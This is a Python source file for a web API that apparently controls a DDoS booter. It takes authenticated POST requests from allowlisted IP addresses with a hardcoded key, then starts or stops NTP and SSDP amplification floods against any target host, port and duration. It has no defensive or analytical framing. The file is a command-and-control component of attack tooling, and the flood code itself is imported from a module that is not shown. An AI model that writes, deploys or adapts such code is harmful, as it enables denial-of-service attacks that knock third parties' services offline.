#!/usr/bin/env python
#-*- encoding: utf-8 -*-
'''
Created on 2017-07-07 11:54:51

@author: vforbox <vforbox@gmail.com>
'''

from lib import web
from lib.ddos import DDoSAttack

key     = ['MKjYkihy']
method  = ['ntp', 'ssdp']
allow   = ['127.0.0.1', '103.210.237.221']

class ApiHandler(object):
	def GET(self):
		return 'Fuck.'

	def POST(self):
		if web.ctx.get('ip') not in allow:
		    return 'deny'

		data = web.input()
		(host, port, time, met, keys, stop) = '', 80, 50, 'ntp', '', '0'

		if data.get('method'):
			met = data.get('method')
		if data.get('host'):
			host = data.get('host')
		if data.get('port'):
			port = data.get('port')
		if data.get('time'):
			time = data.get('time')
		if data.get('key'):
			keys = data.get('key')
		if data.get('stop'):
			stop = data.get('stop')
		if host == '':
			return 'Host is empyt.'
		if keys not in key or keys == '':
			return 'Key Error.'
		if stop != '0' and stop != '1':
			return 'Stop Parameter error.'

		ddos = DDoSAttack(host, port, time)

		if stop == '1':
			if ddos.stop():
				return '停止任务成功'
			else:
				return '停止任务失败'

		if met in method:
			if met == 'ntp':
				if ddos.ntp(thread=100):
					return 'NTP 模式，攻击目标IP [{0}] 成功'.format(host)
				else:
					return 'NTP 模式，攻击目标IP [{0}] 失败'.format(host)
			elif met == 'ssdp':
				if ddos.ssdp(thread=100):
					return 'SSDP 模式，攻击目标IP [{0}] 成功'.format(host)
				else:
					return 'SSDP 模式，攻击目标IP [{0}] 失败'.format(host)
		return 'Fuck.'